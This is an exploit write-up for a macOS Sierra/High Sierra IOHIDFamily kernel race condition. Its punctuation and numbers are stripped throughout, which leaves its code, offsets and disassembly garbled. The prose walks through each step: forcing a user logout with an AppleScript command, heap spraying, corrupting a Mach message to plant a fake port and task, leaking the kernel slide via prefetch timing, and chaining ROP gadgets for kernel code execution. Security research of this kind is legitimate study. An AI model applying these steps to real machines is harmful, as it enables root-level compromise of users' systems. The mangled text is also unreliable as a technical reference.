initialising actual data structure get interesting vulnerability beginning iohidsystem initshmem containing vulnerability int evoffsets eop int oldflags top sharedmem evoffsets structure eop evoffsets shmemaddr clean oldflags evglobals char shmemaddr sizeof evoffsets eventflags bzero void shmemaddr shmemsize fill evoffsets structure eop evglobalsoffset sizeof evoffsets eop evshmemoffset eop evglobalsoffset sizeof evglobals find pointer start globals private shmem region evg evglobals char shmemaddr eop evglobalsoffset ev void char shmemaddr eop evshmemoffset spot told function called shared memory already mapped calling task evoffsets declared volatile p thing line eop evglobalsoffset sizeof evoffsets one evg evglobals char shmemaddr eop evglobalsoffset value eop evglobalsoffset change cause evg point somewhere intended looking source vulnerability seems present least since far back also used copyright notice next computer inc noting eventdriverm file nowhere found web vulnerable code came date copyright notice trusted would put origin bug even year back older know gon na assume came life putting exploit together fun part p getting access anything else look actually get access thing wan na play ie spawn iohiduserclient windowserver holding available one first option implemented get windowserver task port steal client machportextractright work like charm problem requires root sip disabled next lower option simply kill windowserver still requires root least work sip enabled windowserver go userclient get cleaned plenty time spawn side effect also notice system entire graphical interface going along windowserver exactly stealthy point digging found windowserver actually let go userclient second user log enough time u grab finally something require u run root merely currently loggedin user since easily force logout go lower unprivileged user tl dr yes first try applescript trickery loginwindow implement something called appleeventreallylogout aevtrlgo short attempt log user without confirmation dialogue reason apparent insanity loginwindow seem verify event coming unprivileged account say nobody get away osascript e tell application loginwindow event aevtrlgo work quite flawlessly previous method act user actually chosen log via gui mean apps unsaved change still abort logout least prompt confirmation example terminal running command contrast launchctl tear gui session without letting anyone say damn thing another drawback test success aevtrlgo since call return confirmation popup still active seems like limitation applescript second alternatively logout shutdown reboot well make interesting possibility could write sleeper program wait condition become favourable access statistic assume mac eventually shut rebooted manually rather ever going result panic assumption hold sleeper get chance run snatch userclient need order maximise success rate following install signal handler sigterm sighup buy u least second logoutshutdownreboot initiated run launchctl reboot logout former failed run osascript e tell application loginwindow event aevtrlgo try spawning desired userclient repeatedly whether succeeded logging user matter point wait manual logoutshutdownreboot long return value ioserviceopen kioreturnbusy keep looping implemented srchidobtainc part residing srchidmainc triggering bug access secured get triggering bug obvious lucky enough modify eop evglobalsoffset right moment likely go wrong three possible outcome lose race ie evg set iohidfamily intends win race manage offset evg evg point data structure placed heap win race evg land something intended last case probably cause panic sooner unmapped memory later corruption data structure luckily happen rarely repair corruption anyway gon na focus two case first one undesirable unproblematic try second one one want thanks initialisation performed iohidsystem even detect happened first entire shared memory using correct address bzero ed afterwards many field set offset address hold constant value calling initialisation routine query field hold evg offset otherwise chose version field implementation conclusion one thread spam value eop evglobalsoffset another thread call initialisation routine evg version implemented srchidexploitc minimal standalone implementation also exists srcpocmainc shmem basic trigger memory corruption exactly first look big corruption actually cause eop evglobalsoffset type signed int offset evg intmax byte either direction quite lot next look structure size since exported userland include iokit header sizeof gcc tc wall framework iokit include stdioh include iokithidsystemiohidsharedh int main void printf lxn sizeof evoffsets sizeof evglobals return sierra high sierra yield also quite word slap one monster memory structure entire two gigabyte back forth memory inspired name iohideous priori know neither structure resides kernel memory lie respect far know allocated via iobuffermemorydescriptor kiomemorykernelusershared go iopaalloc subsequently map memory provided task case kerneltask mapping end kernelmap knowing sharing type rounded size easily find kmap bash sudo kmap e fgrep fgrep mem tru rwrwx mem tru cp dynamic running couple time sierra yield address like high sierra give u much since look like arbitrary location heap order statistic need know looking seems extremely unlikely would structure fixed offset shared memory best bet likely make lot allocation place certain structure fixed offset let look allocation go prime kernel memory allocator used virtually iokit kalloc allocation smaller equal two page size arm passed zalloc corresponding kallocx zone handle allocation larger two page size go kallocmap first becomes full directly kernelmap allocation lot larger two page size go directly kernelmap affect u got two possible target kallocmap kernelmap first look kernelmap entire virtual address space kernel unlike zalloc zone map employ freelists allocation happen practically anywhere however unless explicitly told vmmap function kalloc iomemorydescriptor go always put allocation lowest free address gap large enough mean likely allocation make placed next also shared memory mapped manner offset likely address still free could spray sierra translates quite nicely practice high sierra found way barred fact allocation would happen address shared memory resided around tracked back mainly large mapping two bash sudo kmap e fgrep rwrwx map prv cp vm compressor evident tag monster map belongs virtual memory compressor also exists sierra shared memory sits whereas high sierra sits likely result iohidsystem allocating shared memory iohidsystem init called much earlier iohidsystem createshmem ever could kernelmap hot sierra high sierra kallocmap submap kernelmap fixed size specifically physical memory size ie sierra identifiable exact size fact map high sierra even got tag bash sudo kmap e fgrep kalloc rwrwx map prv cp kalloc address look like could well range shared memory done couple probe across reboots sorted distance kalloc map shared memory memory size memsizen bootarg wicked useful shmem kalloc start kalloc end start diff end diff shmem kalloc start kalloc end start diff end diff nice difference le offset note kalloc address lower shmem one difference negative really lucky offset value signed p done statistic sierra well see datashmemtxt difference larger expected high sierra go kallocmap target set look maximise chance landing structure sprayed u map allocation usually happen lowest possible address higher address le likely previously allocated ie likely allocated u sierrathe kernelmap yield strategy fill kallocmap make worth allocation kernelmap offset evg read corrupt structure offset high sierrathe kallocmap fill kallocmap offset evg ca read corrupt structure offset note sysctlbyname hwmemsize reveals system memory size size kallocmap derived value quite arbitrary order land inside kallocmap need negative offset larger biggest possible difference end kallocmap beginning shared memory also smaller smallest possible difference beginning kallocmap beginning shared memory ideally also small possible land closer end map biggest smallest observed difference chosen conservative guess likely possible derive fitting value based actual memory size seems affect difference lot statistic eventually grew tired rebooting work fine change kallocoffsetamount srchidconfigh like different value better making worth allocation take well minute machine longer like wait found allocating offsetting little bit le still worked every time though added configuration srchidconfigh default selectable dplayitsafe compiler flag reading writing memory first general problem know whether offsetting evg certain amount place beginning sprayed memory structure somewhere middle know allocation start page boundary though including shared memory rounded multiple page size must bigger nothing else help spray object size three possible offset x x x perform read write operation multiple time sequence three time offset least still get chance getting right writing memory quite easy least much byte concerned iohidsystem initshmem take single argument bool clean false memory previously existed already used follows int oldflags clean oldflags evglobals char shmemaddr sizeof evoffsets eventflags evg eventflags oldflags writing byte simple put data eventflags offset evg byte copied note shmemaddr used source rather evg copy anything true eventflags course dozen kilobyte memory belonging structure quite obstacle want rewrite pointer threaten lay waste everything vicinity turn quite lot gap though left untouched initialisation special care taken method actually suffice note call bzero initshmem also us shmemaddr argument rather evg harm either memory offset implemented srchidexploitc reading memory kind fundamental requirement though destroy target structure could also still prove useful writing initialisation pretty much control way achieve initialisation target memory happens initialisation offsetting shared memory case mean reallocate target object offsetting evg could also buffer filled long allocation general idea make lot kalloc allocation using object whose corruption bad consequence eg buffer offset evg reallocate memory intersecting evg possibly using different object perform read write operation get bit point bit tricky pull since general way telling object exactly intersect evg naive implementation would reallocate sprayed object work terrible performance time heap feng shui iosurface api offer way attach cf property list type iosurface buffer precisely store arbitrarily many result osunserializexml kernelland well read back delete time seems like freaking made cause using following create iosurface spray heap attaching lot osstrings surface offset evg read back stored string detect evg initialisation happened possibly reposition evg alignment free intersecting string reallocate memory useful data structure read write structure two note regarding use osstring would used osdata turn one changed use kmemalloc kernelmap rather kalloc allocation larger one page word osdata buffer never go kallocmap anymore serialised format osstring contain null terminator unlike ossymbol however one added instantiatingunserialising thus occupy n byte serialised length actually note regarding iosurface property exported api support cf object finegrained control data send well increased performance want use binary data format directly go iokit function rather iosurface one involves four external method invocation iosurfacerootuserclient external method creates new iosurface struct input take serialised plist property specify surface attribute pas iosurfacecreate struct output return data know contains identifier offset kernel declares output max size byte use construct union char padding struct machvmaddresst pad id data surface whether field truly surface id know pas value function later order specify surface wan na operate external method attache single property name surface struct input take serialised plist data except prefixed header first byte id remaining byte likely padding property name expected contained toplevel array property index name index struct output idea external method serialises retrieves either single named property property name given struct input method take header instead serialised plist data take property name nullterminated c string struct output return serialised property property binary format external method deletes named property struct input retrieving property struct output byte whose meaning know settled let look read write memory evg moved already writing much simpler first use eventflags since nice function void iohidsystem updateeventflagsgated unsigned flag osobject sender unused eventsopen evg eventflags evg eventflags keyboardflagsmask flag keyboardflagsmask nanosecondstoabsolutetime clicktime unlike api function exported external method userclient instead handled setproperties ioreturn iohidsystem setproperties osobject property osdictionary dict ioreturn ret kioreturnsuccess dict osdynamiccast osdictionary property dict osnumber modifiersvalue osdynamiccast osnumber dict getobject kiohidkeyboardglobalmodifierskey modifiersvalue updateeventflags modifiersvalue return ret return ret updateeventflags indirection event queue well command gate ultimately arrives updateeventflagsgated kiohidkeyboardglobalmodifierskey string hidkeyboardglobalmodifiers call simple enough one thing remains though much bitmasking updateeventflagsgated restrain u keyboardflagsmask orproduct lot constant define keyboardflagsmask nxalphashiftmask nxshiftmask nxcontrolmask nxalternatemask nxcommandmask nxnumericpadmask nxhelpmask nxsecondaryfnmask nxdevicelshiftkeymask nxdevicershiftkeymask nxdevicelcmdkeymask nxalphashiftstatelessmask nxdevicealphashiftstatelessmask nxdevicercmdkeymask nxdevicelaltkeymask nxdeviceraltkeymask nxdevicelctlkeymask nxdevicerctlkeymask created separate program dataflagsc print constant gave value look restrictive actually write arbitrary pointer data considering fact evg eventflags keyboardflagsmask retained might enough modify something existing useful way onto reading one fair bit trickier code read evg either export data elsewhere make sense since client access shared memory already ridiculously hard trigger example call evdispatch cause upper bit x component evg screencursorfixed copied shared memory ioframebuffer shared memory readily accessible u ioframebuffershareduserclient however order value actually copied frame buffer need previously attached iohidsystem via call iohiduserclient connectclient evg frame control inclusive cursor screen represented ioframebuffer evdispatch actually called hardly ideal one thing though read happens also writes evg cursorhelper instance iohidsystemcursorhelper used coordinate system arithmetic well conversion field evg cursorloc evg screencursorfixed evg desktopcursorfixed important u separate storage act cache extent use read value evg one time write back another copy small amount memory actual shared memory mapped task writing back part easy enough look iohidsystem initshmem evg cursorlocx cursorhelperdesktoplocation xvalue evg cursorlocy cursorhelperdesktoplocation yvalue evg desktopcursorfixedx cursorhelperdesktoplocation xvalue evg desktopcursorfixedy cursorhelperdesktoplocation yvalue evg screencursorfixedx cursorhelpergetscreenlocation xvalue evg screencursorfixedy cursorhelpergetscreenlocation yvalue reading got three candidate evg screencursorfixed read sent ioframebuffer otherwise ever written useless u evg desktopcursorfixed read iohidsystem setcursorposition cursorcoupled external externally triggered call external true iohidsystem resetcursor evg updatecursorpositionfromfixed true control evg offset evg cursorloc last actually useful passed setcursorposition stored unchanged cursorhelper void iohidsystem setcursorposition iogpoint newloc bool external osobject sender eventsopen true clockgetuptime cursoreventlast cursorhelperdesktoplocationdelta xvalue newloc x cursorhelperdesktoplocation xvalue cursorhelperdesktoplocationdelta yvalue newloc cursorhelperdesktoplocation yvalue cursorhelperdesktoplocation fromintfloor newloc x newloc setcursorposition external false sender cursormovelast cursoreventlast schedulenextperiodicevent ok reach code path setcursorposition called two place unregisterscreengated setdisplayboundsgated requires background iohidsystem notion virtual screen cursor method create destroy screen set bound function exported external method iohiduserclient meaning readily accessible u order read byte memory structure register virtual screen allocate iosurface spray heap attaching lot osstrings surface offset evg read back stored string detect evg initialisation happened possibly reposition evg alignment free intersecting string reallocate memory useful data structure update bound virtual screen reinitialise evg back actual shared memory read copied value shared memory cursor problem addition work take special care something else evg screencursorfixed evg desktopcursorfixed reading evg cursorloc may cause two field written calling cursor problem specifically setcursorposition called external true first reach point osspinlocktry evg cursorsema host using shmem try later return evg cursorsema fall nonzero value setcursorposition abort safe otherwise however arrive following block code cursorhelperdesktoplocation xvalue evg desktopcursorfixedx cursorhelperdesktoplocation yvalue evg desktopcursorfixedy proximitychange cursorhelperdesktoplocationdelta cursormoved false mouse moved cursor nt else evg cursorlocx cursorhelperdesktoplocation xvalue evg cursorlocy cursorhelperdesktoplocation yvalue evg desktopcursorfixedx cursorhelperdesktoplocation xvalue evg desktopcursorfixedy cursorhelperdesktoplocation yvalue pinscreen cursorhelperupdatescreenlocation screen pinscreen desktopbounds screen pinscreen displaybounds else cursorhelperupdatescreenlocation null null evg screencursorfixedx cursorhelpergetscreenlocation xvalue evg screencursorfixedy cursorhelpergetscreenlocation yvalue block unlikely entered since cursorhelper updated value evg cursorloc experience unlikely match evg desktopcursorfixed least useful way else branch entered evg desktopcursorfixed evg screencursorfixed written basically evg cursorsema evg desktopcursorfixed evg screencursorfixed written may may problem depending memory structure intersecting sound like fun p leaking kernel slide tedious way matter wan na kernel point gon na defeat kaslr learn kernel slide intend run rop need pretty early even get prime candidate revealing kernel slide usually pointer dynamically allocated structure point back main kernel binary often function string c vtables ability read byte memory choosable memory structure sound pretty easy realise virtually structure small enough handled zalloc ie get kallocmap kernelmap fact yet learn object made large enough handled zalloc contains pointer main kernel binary whatsoever know one please tell let despair instead look structure allocate onto kallocmap kernelmap list one know quite possibly incomplete data buffer example include osstring form iobuffermemorydescriptor pointer array example buffer allocated osarray osdictionary struct ipckmsg container within mach message wrapped data buffer contain exclusively usersupplied data reading entirely useless writing could break assumption established sanitisation earlier meh pointer array contain exclusively pointer dynamically allocated object corrupting might get u code execution know address put fake object reading might tell u address might object freed however neither get u closer kernel slide leaf kmsg boy kmsg something let take closer look kmsg end mach message client sends mach message consists header containing size message destination port etc body body contain descriptor outofline memory outofline array mach port single inline mach port body space used descriptor copied give u byte buffer arbitrary size containing binary data well pointer message enters kernelland machmsg trap kernel allocates one large designated buffer ipckmsg header copy resolve port name pointer translates descriptor add trailer contains information sender finally add kmsg message queue destination port buffer holding kmsg need significantly larger raw mach message due kmsg header message trailer also due fact size descriptor different context addition function allocating buffer idea whether descriptor message coming know userspecified message size make protective assumption ie small descriptor translated big one entire message body consists descriptor currently mean every byte body size kernel allocates byte mean take special care size wan na fill mach message hole punched heap also due variable size descriptor always precede nondescriptor data sent message mach message aligned end kalloc ed buffer rather beginning header pulled backwards needed descriptor translated end ipckmsg header sits beginning kalloc allocation btw field ikmheader point header mach message knowing use advantage plain reading seems futile point writing gon na u good ian beer previously exploited kmsg corrupting ikmsize field ipckmsg leading heap overflow allowing controlled reading writing requires appropriate object reside kmsg memory however case u otherwise move evg couple page mess value field pointer whose corruption would require farreaching construction fake object mostly flatout copied userland ikmheader msghsize used size copyout corrupting would yield another heap overflow could corrupt ikmheader would allow u construct entire custom mach message however would require valid port pointer least could read original mach message one one tedious another much nicer field though allows u get basically result much le effort msghdescriptorcount targeting send message byte buffer descriptor change msghdescriptorcount suddenly receiving message beginning byte buffer interpreted descriptor detail really simple msghdescriptorcount int already looked write bit memory offsetting evg targeting least significant bit fit nicely writing mask figured create send anything descriptor describe straightforward choice seems fake mach port fake task struct allow u read arbitrary memory via pidfortask technique previously used luca todesco jailbreak subsequently tihmstar truly phœnix phœnixnonce order pull need address put fake port task structs device without smap could put process memory dull userland dereference gon na though since one macbook developing exploit biggest part equipped smap secondly always nice break one security feature p alright need kernel address guess already one kmsg ikmheader use directly since entire kmsg deallocated receive knowing size message sent use ikmheader calculate address ipckmsg header due nature exploit happens exist something known offset address iohidsystem shared memory made byte directly writeable kerneladressable memory getting exploit data kernel hardly get nicer reading ikmheader work detail address make bit wide mean read two step since every reading operation reset evg need entire cycle deallocating kmsg filling space buffer memory offsetting evg allocating new kmsg two reading new kmsg size old one filled heap hole ikmheader gon na hold value problem one thing though remember cursor problem find affect u case let look first member ipckmsg evglobals structs reading top bit ikmheader overlay like evg cursorsema fall onto bottom bit ikmnext pointer another kmsg since one also allocated via kalloc lower bit pointer exceedingly unlikely zero case safe bottom bit ikmheader evg cursorsema fall onto padding ikmsize ikmnext see zeroed anywhere code theory could anything however practice ever seen zero even always case remains possibility perform reading operation iohidsystem setcursorposition run evg screencursorfixed evg desktopcursorfixed written intersect ikmimportance ikminheritance marked red diagram bad receive kmsg machmsgreceiveresults called invoke ipcimportancereceive lead u bit assuming voucher iienull kmsg ikmimportance ipcimportanceelemt elem ipcimportancelock elem ipcimportancekmsgunlink kmsg iierefdebug elem iiekmsgrefsdropped endif ipcimportancereleaselocked elem importance unlocked recall value written evg screencursorfixed evg desktopcursorfixed depend value previously read evg cursorloc since reading valid pointer write nonzero value mean iienull kmsg ikmimportance hold true block entered lead call ipcimportancekmsgunlink defined follows static ipcimportanceelemt ipcimportancekmsgunlink ipckmsgt kmsg ipcimportanceelemt elem kmsg ikmimportance iienull elem ipcimportanceelemt unlinkelem unlinkelem iietypeinherit iietype elem ipcimportanceelemt ipcimportanceinheritt elem iiitotask elem queueremove unlinkelem iiekmsgs kmsg ipckmsgt ikminheritance kmsg ikmimportance iienull return elem fully understand happens corrupted field need look two macro iietype queueremove define iietype e e iiebits iietypemask define queueremove head elt type field macrobegin queueentryt next prev next elt fieldnext prev elt fieldprev head next head prev prev else type void next fieldprev prev head prev head next next else type void prev fieldnext next elt fieldnext null elt fieldprev null macroend ipcimportancekmsgunlink ultimately dereference ikmimportance ikminheritanceprev ikminheritancenext corrupt due conversion cursorloc screencursorfixeddesktopcursorfixed way value write valid pointer choice somehow repair breaking reading receive kmsg tool got disposal pull evg order determine possible first finalise plan exactly shape heap implementation first spraying osstrings size offsetting evg detecting land punch hole size ie deallocate string kmsg create lower address hole size ie string way new allocation byte le first fill hole interfering plan allocation bigger byte big kmsg hole leave u alone anyway kmsg size byte imply currently high sierra size struct ipckmsg machmsgbaset machmsgmaxtrailert byte respectively already seen kernel reserve byte every byte message body size mean body part kmsg byte mach message send need byte body since send descriptor actually lead byte kmsg header completely unused good let u whatever want evg around kmsg header without chance corrupting anything due holepunching still string buffer byte right quite enough buffer full byte evg still lot actually evg term repair easiest thing would could use evg eventflags write zero consider initialisation kernel usage value around eventflags look rather bad fact value shortly eventflags initialised nonzero unknown value mean write four time least one overwritten next best approach anyway would seem try use cursorsema initialisation zero thing since beginning evg writes could continuously shift evg memory kmsg header however cursorsema zero kernel may change nonzero value given time happens right move evg leave nonzero value repaired anything field evg initialised zero notably evg lleq array nxeqelements far tell code iohidfamily access memory beyond initialisation seem exported anywhere kernelland either put kernel writes way leaf initialisation since array nicely use lleq zero thing last byte lleq give u enough space leave rest header intact visible give u enough space bit blessed luck something using sema eventtype field zero need perform three operation total two undo earlier corruption one next field writes nonzero value right memory zero lower half ikmimportance ultimately write nonzero value ikmqosoverride bad consequence note could also used last element lleq instead get next field set zero would make sure byte mapped memory instead meh anyway repair kmsg nothing standing u fake mach port anymore well except actual fake port kobject getting usable definition struct ipcport userland bit tedious requires digging dozen header result fair done work phœnixphœnixnonce already merely update also kptrt typedef ed typedef struct ipbits ipreferences struct kptrt data type pad iplock spinlock struct struct struct flag waitqinterlock waitqsetid waitqprepostid struct kptrt next kptrt prev waitqqueue waitq kptrt message naturalt seqno naturalt receivername msgcount qlimit pad port kptrt klist ipmessages kptrt ipreceiver kptrt ipkobject kptrt ipnsrequest kptrt ippdrequest kptrt iprequests kptrt ippremsg ipcontext naturalt ipflags naturalt ipmscount naturalt ipsrights naturalt ipsorights kportt struct task much lazier defining really necessary exception iplock actually needed typedef struct struct kptrt data type pad iplock mutex refcount pad offtaskbsdinfo sizeof sizeof kptrt kptrt bsdinfo ktaskt offtaskbsdinfo offset bsdinfo field kernel task struct grabbed disassembly getbsdtaskinfo getbsdtaskinfo push rbp mov rbp rsp mov rax qword rdi pop rbp ret moving evg last time zero second third page shared memory avoiding first page case kernel writes anything initialise two structure like shmemaddr shmemkern userland kernel address shared memory respectively kportt kport kportt shmemaddr pagesize ktaskt ktask ktaskt shmemaddr pagesize kport ipbits iobitsactive iotport ikottask kport ipreferences kport iplocktype kport ipmessagesportreceivername kport ipmessagesportmsgcount machportqlimitkernel kport ipmessagesportqlimit machportqlimitkernel kport ipkobject shmemkern pagesize kport ipsrights ktask refcount reference right count arbitrary number high enough make sure deallocation attempted two machportqlimitkernel prevent accidental message sent port simulating full message queue would attempt dereference pointer ipmessagesklistmessages set anything else fairly straightforward order read byte arbitrary kernel address merely need set bsdinfo address want minus byte offset pid field struct proc call pidfortask last successfully turned constrained read write primitive full arbitrary read need something read kernel slide still know know address shared memory kmsg hole nice could reuse latter somehow learn slide already enumerated structure allocate place data buffer pointer array struct ipckmsg beginning problem pointer array would ever contain pointer object allocated heap follow constrained read primitive arbitrary read however thing looking much better allocate say osarray read pointer first object contains address read first byte get vtable resides constconstdata whose address thus reveals kernel slide allocate osarray large enough pointer array reach byte one way achieving would actually allocate array element could use osbooleans go easy memory even take advantage binary serialisation format namely fact dictionary array set take length specifier userland effectively set osarray size later multiplied size pointer supply single element call inflated array even though could ultimately also send kmsg actual port eg ioservice object would also get u c object pointer review spray kallocmap osstring buffer offset evg read string back find landed punch hole underneath allocate kmsg hole read ikmheader yielding shmem kernel address repair damage done allocate new kmsg body byte corresponding port descriptor pointing somewhere shared memory flip msghdescriptorcount byte actually interpreted descriptor construct fake port task shared memory receive kmsg thus inserting fake port namespace point fakeportipkobjectbsdinfo address use pidfortak fakeport read point could also attach vmmapt say kernelmap fake task gain full rw swap fake task fake ioservice object custom vtable allowing u call arbitrary kernel code gon na leave leakage kernel slide though implemented srcleakmainc leaking kernel slide cheater way edit technique explained reason stopped working macos high sierra know bother investigate iohidfamily vulnerability still hid binary current state work could patch together hid leak get everything working even write machportbased exploit leak hear mach port real deal p nice actually super fun piece together slight drawback scanning osstrings find evg landed take significant amount time execute getting iohiduserclient port real attack scenario would mean run logout user would confronted black screen quite bit longer expect comfortable run shutdownreboot might even get killed get work done depends physical memory size also le likely targeting kallocmap likely kernelmap top way leak slide chronologically last part exploit wrote reason gon na look another way leak kernel slide one executed independently part exploit hardware vulnerability long story short prefetch cache timing attack devised grus et al add nothing new technique merely wrote implementation unfamiliar work basic vulnerability lie prefetchtn instruction n designed hint cpu program want data address loaded particular cache interesting property ignore access permission kind allowing even prefetching kernel memory still able read cache though perform number address lookup attempt stop soon find something mean unitialised evicted cache execute significantly faster mapped address unmapped one silently ignore error actual vulnerability nice property interestingly enough implementation found web seemed work ended writing like paper target instruction ie cache every timing evict cache use mfence synchronise memory access invoke use rdtscp get time difference eviction use cache rather miss go main memory leaf much bigger mark time difference also notable difference evicting lot smaller efficient way know allocate memory block large cache divide part large cache line size single memory read part conveniently two sysctl entry hwcachelinesize giving u exactly size order find kernel base start address go step byte perform timing step throw schedyield timing minimise external interference implemented datakaslrc running yield following kernel base difference timing visible formalising indicate location kernel base trivial though mostly due outlier dull trialanderror found following procedure highly reliable least two machine sort timing address shortest longest discard middle value calculate average value treat address mapped otherwise treat unmapped find first block mapped address large enough contain kernel text segment implemented srchidkaslrc despite author paper stating attack work also virtualised environment observed timing mapped unmapped page indistinguishable high sierra installation running inside virtualbox vm tried whatever already shown bug leak kernel slide need p getting rip control back corrupting stuff heap evg since want thing work way leaking kernel slide gon na assume back knowing kernel address shared memory able read kernel memory thing take granted kernel slide back constraint want exploit run fast possible ie fast enough shutdown able slip user getting logged kernel killing u end gon na single heap spray obtaining iohiduserclient port avoid kind bulk iteration except final deallocation includes reading back reallocating regard evg capability eliminates writing via eventflags offsetting turn requires laying waste memory surrounding target memory fatal looking allocate kallocmapkernelmap data buffer pointer array kmsg thing let u pointer array ideally containing single pointer surrounded nothingness eg demonstrated earlier inflated array time gon na change two thing though gon na use ioserviceaddnotificationool rather iosurface call osunserializexml keep result kernel return u mach port call notification port nice thing invoke destruction kernelrpcmachportdeallocatetrap mach trap mean deallocate sprayed object attached fast without even need mig message instead one inflated array gon na cram lot single port increase allocation deallocation efficiency well decrease overhead whatever ioserviceaddnotificationool actually supposed limited byte data feed osunserializexml property mig message defined ioserviceaddnotificationool binary representation inflated array short kosserializearray byte array kosserializeendcollection kosserializeboolean byte content take away byte mandatory magic dictionary tag ossymbol tag ossymbol content osarray tag contain inflated array could max inflated array per notification port due later involvement however gon na drive far instead leave nice still enough point memory targeting evg lonely pointer kosbooleantrue every byte zero never used kernel avid reader might notice le size shared memory using size help either know exactly pointer anyway know beginning pagealigned buffer page get u back x x x possible location even chose instead possible location trying would put u adjacent block order fix first work part exploit though let put later wan na corrupt pointer thing kernel slide whatever change pointer gon na look least part like valid osobject userwriteable memory kernel data segment could use something right turn iohibernateiocpp declared static hibernatestatisticst hibernatestats hibernatestatisticst defined follows struct hibernatestatisticst imagesize imagepages booterstart smcstart booterduration booterconnectdisplayduration bootersplashduration trampolineduration kernelimagereadduration graphicsreadytime wakenotificationtime lockscreenreadytime hidreadytime wakecapability resva typedef struct hibernatestatisticst hibernatestatisticst reason beyond understanding exists also iohibernateiocpp sysctluint kern oidauto hibernategraphicsready ctlflagrw ctlflagnoauto ctlflagkern ctlflaganybody hibernatestatsgraphicsreadytime sysctluint kern oidauto hibernatewakenotification ctlflagrw ctlflagnoauto ctlflagkern ctlflaganybody hibernatestatswakenotificationtime sysctluint kern oidauto hibernatelockscreenready ctlflagrw ctlflagnoauto ctlflagkern ctlflaganybody hibernatestatslockscreenreadytime sysctluint kern oidauto hibernatehidready ctlflagrw ctlflagnoauto ctlflagkern ctlflaganybody hibernatestatshidreadytime well ctlflagrw ctlflaganybody interesting combination global variable human term mean process full readwrite capability struct member graphicsreadytime wakenotificationtime lockscreenreadytime hidreadytime oh conveniently lie next bash sysctl kernhibernategraphicsready kernhibernategraphicsready bash sysctl kernhibernategraphicsready bash sysctl kernhibernategraphicsready kernhibernategraphicsready top sysctlstruct kern oidauto hibernatestatistics ctltypestruct ctlflagrd ctlflagnoauto ctlflagkern ctlflaglocked hibernatestats hibernatestatisticst additionally give u readonly access hibernatestats might come handy leaking data note like bug entire facility containing sysctl exists macos since hibernation thing mobile device also hibernatestats exported kernel symbol table obtaining address easy enough given first statement hibernatemachineinit exported call bzero hibernatestats hibernatemachineinit push rbp mov rbp rsp push push push push push rbx sub rsp lea rdi mov esi call symbzero address hibernatestats pretty evidently case made byte writeable kernel memory whose address derive point let get back problem put aside earlier fix corruption adjacent pointer offsetting evg original pointer corrupting value kosbooleantrue location inside zonemap value wan na rewrite hibernatestats somewhere kernel data segment interesting two far apart main kernel binary always resides somewhere zonemap start value usually lower since kosbooleantrue allocated early exceedingly likely far beginning zonemap effectively address kosbooleantrue hibernatestats top bit namely u mean rewrite lower bit reduces amount memory corrupt memory corrupt exactly dealing entire page size thing evg beyond first page lleq created another little program dataalignc model five page first holding pointer first byte simulates initialisation lleq intersects pointer take single signed int command line argument amount evg shifted output displayed list address lleq initialisation happens could possibly intersect pointer intersection indeed occur specific address coloured red example value red telling u half pointer page would corrupted entirely align evg cursorsema start page wanted know look align evg eventflags start page rewrite lower bit kosbooleantrue hibernatestats pas argument since shift evg time size backwards lo behold none value red word using eventflags rewrite first byte page leave first byte following page entirely intact really blessed immense luck today anyway celebrate later need come way turning hibernatestats memory something useful byte mean exactly two pointer since memory gon na interpreted osobject byte need function vtable pointer could either use remaining byte data try find pointer one kernel constant section point code something useful data could forge fake vtable way remaining byte used pointer virtual function invoked object going taggedrelease offset btw deallocate everything first method sound rather hard pull since kernel likely gon na contain pointer actual function opposed useful rop gadget virtual c function question anyway since valid osobjects byte used object reference counter accessed ever increased decreased never exported used way second method however get u straight one arbitrary gadget worth execution sound bad already enough run arbitrary code though kinda need place put rop chain shared memory would nicely single gadget enough get address back userland least two step find suitabe gadget corrupt one pointer leak shmem kernel address second step corrupt another pointer run full rop chain run exactly one gadget part implemented srchidheapc srchidmainc turning rip rop order run rop need kernel shmem address order leak need look value gon na register time gadget invoked gon na happen free everything ie stack trace array taggedrelease osarray flushcollection osarray free taggedrelease address supplied u called flushcollection look like osarray flushcollection push rbp mov rbp rsp push push push rbx push rax mov rdi test byte je test byte jne lea rdi xor eax eax call sympanic jmp lea rdi strtryingtochangeacollectionintheregistry xor eax eax call symosreportwithbacktrace inc dword cmp dword je xor ebx ebx lea symoscollection gmetaclass nop mov rax qword mov ecx ebx mov rdi qword rax rcx mov rax qword rdi mov rsi call qword rax inc ebx cmp ebx dword jb mov dword add rsp pop rbx pop pop pop rbp ret call qword rax code invokes gadget rdi gon na fake object ie address hibernatestatsgraphicsreadytime rax gon na fake vtable ie address hibernatestatslockscreenreadytime minus rsi pointer oscollection meta class rbx rcx array index object ie pointer parent osarray object ideally want address osarray pointer array one fixed offset shared memory see temporarily loaded rax mov rax qword register moment later replaced pointer object vtable little excourse actually used different sierra loop looked like mov eax ebx mov rcx qword mov rdi qword rcx rax mov rax qword rdi mov rsi call qword rax inc ebx cmp ebx dword jb pointer array address loaded rcx overwritten jumping address gadget dealing rcx somewhat hard come managed find little beauty add dword rdi ecx xchg eax edi ret first xchg eax edi harmless since osobject taggedrelease return nothing thus treat rax rdi scratch register gadget add lower bit buffer address value already present hibernatestatsgraphicsreadytime fine since know original value thus calculate original value ecx going back beginning writeup looking sample shared memory would mapped sierra see following shmem kernel address could upper bit either depending lower bit would either high low subtracting size offset evg original ecx value simply assume bit set upper bit otherwise perform signed integer addition precisely p however high sierra longer get value nicely rcx anymore fact also back el capitan place could still get would directly osarray object ie unfortunately find gadget copying data address based rax rdi outlandish thought calling memcpy cross mind though since suitable target address rdi already get rsi plus minus byte reasonable size rdx hold value invocation taggedrelease osarray enough intention surely something achieve one gadget worth execution right actually mean get halfway abusing pecurrentconsole pecurrentconsole push rbp mov rbp rsp lea rsi mov edx call symmemcpy xor eax eax pop rbp ret chip mov edx get somewhat reasonable size still overflowing hibernatestats since rdi point hibernatestatsgraphicsreadytime deal repair later leaf problem getting rsi also creates new problem pop value stack returning push something jumping gon na panic right away hit ret matter need second gadget since actually fit two pointer hibernatestats memory sort cheat constraint recall reason run one gadget need pointer fake vtable since code call u double dereference arrive gadget technically need fake vtable longer way pause kernel since multithreaded system actually make happen say gadget like jmp rax first invoked like call rax ie address loaded exactly location effectively achieved busy wait kernel mode back userland set alarm timer sufficiently high timeout triggering gadget start second thread nothing continue exist mask main thread sigalrm kernel reach gadget take amount time specified boom get sigalrm sent second thread first switch address used fake vtable second address gadget looping immediately executed put u two gadget worth execution actually writing pointer chunk normally bad idea value continuously used given kernel text segment lot smaller leave top bit untouched swap bottom half happens single step put fake vtable pointer used find gadget move rsi push exactly one value onto stack transfer control either rdi rax conveniently enough seems shortage gadget mov rsi call qword rax alright achieved complete function call 